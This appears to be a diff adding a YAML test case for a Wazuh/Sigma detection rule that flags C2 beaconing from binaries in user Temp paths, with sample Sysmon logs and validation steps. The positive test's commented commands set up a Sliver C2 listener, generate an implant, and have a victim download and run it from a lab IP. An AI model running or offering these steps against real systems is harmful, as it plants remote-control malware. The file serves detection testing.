@@ -1,0 +1,87 @@
+---
+test_id: TC-100009
+rule_id: 100010
+rule_name: C2 Beaconing — Repeated Outbound Connections
+mitre_technique: T1071.001
+wazuh_rule_file: detections/wazuh-rules/100009-c2-beaconing.xml
+sigma_rule_file: detections/sigma/sigma-100009-c2-beaconing.yml
+
+# --- Positive Test ---
+positive_test:
+  description: >
+    Sysmon EventID 3 (NetworkConnect) events from a binary located in
+    C:\Users\SOCAdmin\AppData\Local\Temp\ making 10 HTTPS connections
+    to 192.168.64.30:443 within 5 minutes. Simulates Sliver mTLS implant
+    beaconing to the Kali C2 server.
+  art_test:
+    technique: T1071.001
+    test_number: 1
+    command: |
+      # [kali-attacker] Start Sliver listener
+      sliver-server
+      # > mtls
+      # [kali-attacker] Generate implant and serve it
+      # > generate --mtls 192.168.64.30 --save /tmp/beacon.exe
+      # [victim-windows] Download and execute implant (simulate via PowerShell)
+      # Invoke-WebRequest http://192.168.64.30:8080/beacon.exe -OutFile $env:TEMP\beacon.exe
+      # Start-Process $env:TEMP\beacon.exe
+  log_samples:
+    # 10 identical network connect events from the same binary to the same IP
+    - |
+      {
+        "win": {
+          "system": {
+            "eventID": "3",
+            "channel": "Microsoft-Windows-Sysmon/Operational",
+            "computer": "victim-windows"
+          },
+          "eventdata": {
+            "image": "C:\\Users\\SOCAdmin\\AppData\\Local\\Temp\\beacon.exe",
+            "destinationIp": "192.168.64.30",
+            "destinationPort": "443",
+            "initiated": "true",
+            "signed": "false"
+          }
+        }
+      }
+    # Note: paste this event 10 times within 5 minutes to trigger rule 100010
+  expected_output:
+    alert_fired: true
+    rule_id: 100010
+    rule_level: 12
+    rule_description_contains: "C2 beaconing detected"
+    relevant_fields:
+      win.eventdata.image_contains: "AppData"
+      win.eventdata.destinationIp: "192.168.64.30"
+      win.eventdata.destinationPort: "443"
+
+# --- Negative Test ---
+negative_test:
+  description: >
+    A browser (chrome.exe) making multiple HTTPS connections to a CDN IP.
+    Chrome lives in Program Files (not a writable user-path), so it should
+    not match the base rule 100009 image path filter.
+  log_samples:
+    - |
+      {
+        "win": {
+          "system": { "eventID": "3", "computer": "victim-windows" },
+          "eventdata": {
+            "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "destinationIp": "142.250.80.46",
+            "destinationPort": "443",
+            "initiated": "true"
+          }
+        }
+      }
+  expected_output:
+    alert_fired: false
+    note: "chrome.exe path does not match writable-path filter — base rule 100009 will not fire"
+
+validation:
+  command: |
+    sudo /var/ossec/bin/wazuh-logtest
+    # Paste the positive JSON event 10 times (copy/paste rapid succession).
+    # The 10th event should trigger Rule 100010 level 12.
+    # Paste the negative event — should not trigger 100009 or 100010.
+  expected_logtest_output_fragment: "Rule Id: 100010"
